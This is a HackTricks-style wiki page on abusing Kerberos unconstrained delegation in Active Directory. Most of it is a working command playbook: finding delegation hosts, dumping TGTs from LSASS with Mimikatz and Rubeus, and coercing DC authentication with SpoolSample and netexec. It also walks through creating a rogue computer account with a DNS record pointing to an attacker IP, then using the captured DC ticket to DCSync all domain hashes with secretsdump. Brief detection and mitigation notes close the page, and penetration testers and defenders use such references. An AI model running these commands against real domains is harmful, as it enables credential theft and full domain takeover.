# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.

So if a domain admin logins inside a Computer with "Unconstrained Delegation" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc).

You can **find Computer objects with this attribute** checking if the [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute contains [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does:


```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.

To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

If the TGT if from a domain controller, you could perform a [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Find here other ways to **force an authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abusing Unconstrained Delegation with an attacker-created computer

Modern domains often have `MachineAccountQuota > 0` (default 10), allowing any authenticated principal to create up to N computer objects. If you also hold the `SeEnableDelegationPrivilege` token privilege (or equivalent rights), you can set the newly created computer to be trusted for unconstrained delegation and harvest inbound TGTs from privileged systems.

High-level flow:

1) Create a computer you control

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Make the fake hostname resolvable inside the domain

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Enable Unconstrained Delegation on the attacker-controlled computer

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Why this works: with unconstrained delegation, the LSA on a delegation-enabled computer caches inbound TGTs. If you trick a DC or privileged server to authenticate to your fake host, its machine TGT will be stored and can be exported.

4) Start krbrelayx in export mode and prepare the machine NT hash

```bash
# Compute NT hash (MD4 over UTF-16LE) of the machine account password
python3 - << 'PY'
password = '<Strong.Passw0rd>'
import hashlib
print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())
PY
# Launch krbrelayx to export any inbound TGTs
python3 krbrelayx.py -hashes :<NT_HASH>
```

5) Coerce authentication from the DC/servers to your fake host

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx will save ccache files when a machine authenticates, for example:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Use the captured DC machine TGT to perform DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Notes and requirements:

- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.

Detection and hardening ideas:

- Alert on Event ID 4741 (computer account created) and 4742/4738 (computer/user account changed) when UAC `TRUSTED_FOR_DELEGATION` is set.
- Monitor for unusual DNS A-record additions in the domain zone.
- Watch for spikes in 4768/4769 from unexpected hosts and DC-authentications to non-DC hosts.
- Restrict `SeEnableDelegationPrivilege` to a minimal set, set `MachineAccountQuota=0` where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding.

### Mitigation

- Limit DA/Admin logins to specific services
- Set "Account is sensitive and cannot be delegated" for privileged accounts.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec

{{#include ../../banners/hacktricks-training.md}}